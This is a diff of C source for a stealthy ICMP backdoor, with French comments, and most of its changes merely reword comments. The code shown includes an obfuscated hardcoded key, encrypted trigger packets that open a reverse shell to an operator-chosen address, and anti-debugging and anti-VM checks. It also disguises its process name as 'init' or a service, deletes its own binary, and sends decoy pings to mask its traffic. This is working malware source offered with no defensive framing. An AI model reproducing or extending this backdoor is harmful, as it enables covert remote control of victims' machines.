@@ -3,17 +3,15 @@
  *
  * Backdoor ICMP – Victime autonome, furtive et multiplateforme.
  *
- * Améliorations intégrées :
- * - Chiffrement AES-256-GCM avec dérivation de clé via PBKDF2.
- * - La clé prépartagée est stockée obfusquée (XOR 0x55) et déobfusquée au démarrage.
- * - Vérifications anti‑débogage (IsDebuggerPresent sous Windows, TracerPid et contrôle de latence sous Unix).
- * - Détection anti‑VM (via /proc/cpuinfo sur Unix).
- * - Renommage dynamique du processus (avec composante temporelle, et modification plus poussée en mode sleep).
- * - Mode sleep/wake amélioré : en mode sleep, la backdoor se met en veille profonde (dormant),
- *   se renomme en "init" via prctl (sur Linux) et n'exécute aucune commande autre que "wake".
- * - Supervision autonome : le parent relance le listener s’il se termine.
- * - Self‑delete : le binaire tente de se supprimer du disque au démarrage.
- * - Décoys : envoie périodiquement des pings légitimes pour noyer le trafic malveillant.
+ * Améliorations :
+ *  - Chiffrement AES-256-GCM avec dérivation de clé (PBKDF2) et sel aléatoire.
+ *  - La clé prépartagée est stockée obfusquée (XOR 0x55) et déobfusquée à l'exécution.
+ *  - Vérifications anti‑débogage (TracerPid, contrôle de latence, détection VM dans /proc/cpuinfo).
+ *  - Mode sleep/wake : la commande "sleep" met la backdoor en veille profonde (renommée "init" via prctl)
+ *    et la commande "wake" la réactive.
+ *  - Supervision autonome : le parent redémarre le listener si nécessaire.
+ *  - Self‑delete : tentative de suppression du binaire au démarrage.
+ *  - Décoys : un thread envoie périodiquement de vrais pings vers localhost.
  *
  * Compilation (Unix) :
  *    gcc -Wall -Wextra -O2 -D_FORTIFY_SOURCE=2 -o victim_backdoor victim_backdoor.c -lcrypto -lpthread
@@ -62,10 +60,10 @@
 #include <openssl/pkcs5.h>
 #include <openssl/rand.h>
 
-/* --- Configuration de base --- */
+/* --- Configuration --- */
 #define BUFF_SIZE    1024
 
-/* La clé réelle "wA@2mC!dq" est obfusquée par XOR avec 0x55 */
+/* La clé réelle "wA@2mC!dq" est obfusquée (XOR 0x55) */
 static unsigned char obf_secret[] = { 0x22, 0x14, 0x15, 0x67, 0x38, 0x16, 0x74, 0x31, 0x24 };
 static char g_secret_key[10] = {0};  /* Déobfusquée au démarrage */
 
@@ -94,21 +92,20 @@ typedef struct {
 } TriggerInfo;
 #endif
 
-/* --- Variable globale pour le mode sleep --- */
+/* Flag global indiquant le mode dormant */
 volatile int dormant = 0;
 
 #ifndef _WIN32
-/* Pour renommer le processus, on utilise prctl() */
+/* Renommage du processus via prctl */
 void set_process_name(const char *name) {
     prctl(PR_SET_NAME, name, 0, 0, 0);
 }
 #endif
 
-/* --- Déobfuscation de la clé (XOR 0x55) --- */
+/* --- Déobfuscation de la clé (XOR avec 0x55) --- */
 void deobfuscate(char *dest, const unsigned char *src, int len) {
-    for (int i = 0; i < len; i++) {
+    for (int i = 0; i < len; i++)
         dest[i] = src[i] ^ 0x55;
-    }
     dest[len] = '\0';
 }
 
@@ -193,9 +190,9 @@ int derive_key(const unsigned char *salt, int salt_len, unsigned char *key_out, 
    Format du payload : [salt (16)] [IV (12)] [ciphertext] [tag (16)]
    Le plaintext doit être : "<SECRET> <commande> [param]"
    Commandes supportées :
-     - Reverse shell : "<SECRET> <reverse_ip> <reverse_port>"
-     - Sleep : "<SECRET> sleep [duration]"  (si durée omise, sommeil indéfini)
-     - Wake  : "<SECRET> wake"
+      - Reverse shell : "<SECRET> <reverse_ip> <reverse_port>"
+      - Sleep : "<SECRET> sleep [duration]"
+      - Wake  : "<SECRET> wake"
 */
 int aes_gcm_decrypt(unsigned char *payload, int payload_len, unsigned char *plaintext) {
     if (payload_len < (SALT_LEN + IV_LEN + TAG_LEN))
@@ -328,8 +325,8 @@ void initiate_reverse_shell(const char *server_ip, unsigned short server_port) {
 
 #ifndef _WIN32
 /* Traitement du payload.
-   Le plaintext doit être : "<SECRET> <commande> [param]"
-   Commandes :
+   Le plaintext est de la forme : "<SECRET> <commande> [param]"
+   Commandes supportées :
       - Reverse shell : "<SECRET> <reverse_ip> <reverse_port>"
       - Sleep : "<SECRET> sleep [duration]"
       - Wake  : "<SECRET> wake"
@@ -347,48 +344,43 @@ void handle_trigger(unsigned char *payload, int payload_len) {
         if (tokens == 3)
             duration = atoi(param);
         dormant = 1;
-        /* Pour masquer davantage, renommer le processus en "init" */
-        #ifndef _WIN32
+        /* Pour renforcer la furtivité, renommer le processus en "init" */
+#ifndef _WIN32
         set_process_name("init");
-        #endif
+#endif
         if (duration > 0) {
             sleep(duration);
             dormant = 0;
-            /* Rétablir le nom dynamique initial */
-            #ifndef _WIN32
+#ifndef _WIN32
             int num_names = sizeof(service_names) / sizeof(service_names[0]);
             char proc_name[32];
-            snprintf(proc_name, sizeof(proc_name), "%s_%ld", service_names[rand() % num_names], time(NULL) % 1000);
+            snprintf(proc_name, sizeof(proc_name), "%s_%ld", service_names[rand()%num_names], time(NULL)%1000);
             set_process_name(proc_name);
-            #endif
+#endif
         } else {
-            /* Mode sommeil indéfini : attendre une commande "wake" */
-            while (dormant)
-                sleep(1);
-            /* Au réveil, rétablir le nom dynamique */
-            #ifndef _WIN32
+            while (dormant) sleep(1);
+#ifndef _WIN32
             int num_names = sizeof(service_names) / sizeof(service_names[0]);
             char proc_name[32];
-            snprintf(proc_name, sizeof(proc_name), "%s_%ld", service_names[rand() % num_names], time(NULL) % 1000);
+            snprintf(proc_name, sizeof(proc_name), "%s_%ld", service_names[rand()%num_names], time(NULL)%1000);
             set_process_name(proc_name);
-            #endif
+#endif
         }
         return;
     }
     if (strcmp(command, "wake") == 0) {
         dormant = 0;
-        #ifndef _WIN32
+#ifndef _WIN32
         int num_names = sizeof(service_names) / sizeof(service_names[0]);
         char proc_name[32];
-        snprintf(proc_name, sizeof(proc_name), "%s_%ld", service_names[rand() % num_names], time(NULL) % 1000);
+        snprintf(proc_name, sizeof(proc_name), "%s_%ld", service_names[rand()%num_names], time(NULL)%1000);
         set_process_name(proc_name);
-        #endif
+#endif
         return;
     }
-    /* Si la backdoor est en mode dormant, ignorer les commandes autres que wake */
     if (dormant)
         return;
-    /* Traitement de la commande reverse shell : format "<SECRET> <reverse_ip> <reverse_port>" */
+    /* Commande reverse shell : format "<SECRET> <reverse_ip> <reverse_port>" */
     if (tokens == 3) {
         char reverse_ip[64];
         int reverse_port = atoi(param);
@@ -494,7 +486,7 @@ void icmp_packet_listener(void) {
 #endif
 
 #ifndef _WIN32
-/* Anti-VM simple pour Unix */
+/* Anti-VM simple */
 int is_vm_detected() {
     FILE *f = fopen("/proc/cpuinfo", "r");
     if (!f) return 0;
@@ -508,7 +500,7 @@ int is_vm_detected() {
     return vm;
 }
 
-/* Thread décoy : envoie périodiquement de vrais pings vers localhost pour noyer le trafic */
+/* Thread décoy : envoie périodiquement de vrais pings vers localhost */
 void *decoy_thread(void *arg) {
     (void)arg;
     while (1) {
@@ -545,7 +537,7 @@ int main(int argc, char *argv[]) {
     srand(time(NULL));
     /* Déobfuscation de la clé */
     deobfuscate(g_secret_key, obf_secret, sizeof(obf_secret));
-    /* Renommage dynamique initial avec composante temporelle */
+    /* Renommage dynamique initial */
     int num_names = sizeof(service_names) / sizeof(service_names[0]);
     snprintf(proc_name, sizeof(proc_name), "%s_%ld", service_names[rand()%num_names], time(NULL)%1000);
     
@@ -559,7 +551,7 @@ int main(int argc, char *argv[]) {
     for (int i = 1; i < argc; i++) {
          memset(argv[i], ' ', strlen(argv[i]));
     }
-    /* Self-delete : tenter de supprimer le binaire */
+    /* Self-delete : tenter de supprimer le binaire du disque */
     char *exec_path = argv[0];
     if (fork() == 0) {
          sleep(2);
